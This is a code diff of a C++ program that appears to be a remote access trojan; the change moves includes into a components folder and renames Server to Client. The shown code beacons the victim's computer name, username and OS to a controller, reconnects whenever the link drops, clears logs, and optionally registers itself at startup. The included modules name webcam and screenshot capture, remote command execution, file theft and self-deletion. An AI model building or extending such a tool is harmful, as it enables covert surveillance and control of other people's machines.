@@ -21,28 +21,28 @@ char buffer[16384];
 const bool startup = false;
 const int timeout = 300000;
 
-#include "utilities.h"
-#include "RegisterStartup.cpp"
-#include "VBSMessageBox.cpp"
-#include "CaptureScreenshot.cpp"
-#include "CaptureWebcam.cpp"
-#include "ChangeWallpaper.cpp"
-#include "ViewTasks.cpp"
-#include "IdleTime.cpp"
-#include "StartProcess.cpp"
-#include "KillProcess.cpp"
-#include "RemoteCMD.cpp"
-#include "WakeComputer.cpp"
-#include "ViewFiles.cpp"
-#include "SendFile.cpp"
-#include "ReceiveFile.cpp"
-#include "ReadFile.cpp"
-#include "MoveFile.cpp"
-#include "DeleteFile.cpp"
-#include "DeleteDirectory.cpp"
-#include "DeleteSelf.cpp"
+#include "components/utilities.h"
+#include "components/RegisterStartup.cpp"
+#include "components/VBSMessageBox.cpp"
+#include "components/CaptureScreenshot.cpp"
+#include "components/CaptureWebcam.cpp"
+#include "components/ChangeWallpaper.cpp"
+#include "components/ViewTasks.cpp"
+#include "components/IdleTime.cpp"
+#include "components/StartProcess.cpp"
+#include "components/KillProcess.cpp"
+#include "components/RemoteCMD.cpp"
+#include "components/WakeComputer.cpp"
+#include "components/ViewFiles.cpp"
+#include "components/SendFile.cpp"
+#include "components/ReceiveFile.cpp"
+#include "components/ReadFile.cpp"
+#include "components/MoveFile.cpp"
+#include "components/DeleteFile.cpp"
+#include "components/DeleteDirectory.cpp"
+#include "components/DeleteSelf.cpp"
 
-void Server()
+void Client()
 {
     WSADATA wsdata;
     sockaddr_in client;
@@ -61,7 +61,7 @@ void Server()
         closesocket(objSocket);
         WSACleanup();
         Sleep(1000);
-        Server();
+        Client();
     }
 
     send(computer + "\n" + username + "\n" + operatingSystem + "\n" + fileName);
@@ -75,7 +75,7 @@ void Server()
             closesocket(objSocket);
             WSACleanup();
             ClearLogs();
-            Server();
+            Client();
         
         } command = buffer;
 
@@ -172,5 +172,5 @@ int main()
         return EXIT_FAILURE;
     }
     if (startup) RegisterStartup(fileName);
-    Server();
+    Client();
 }
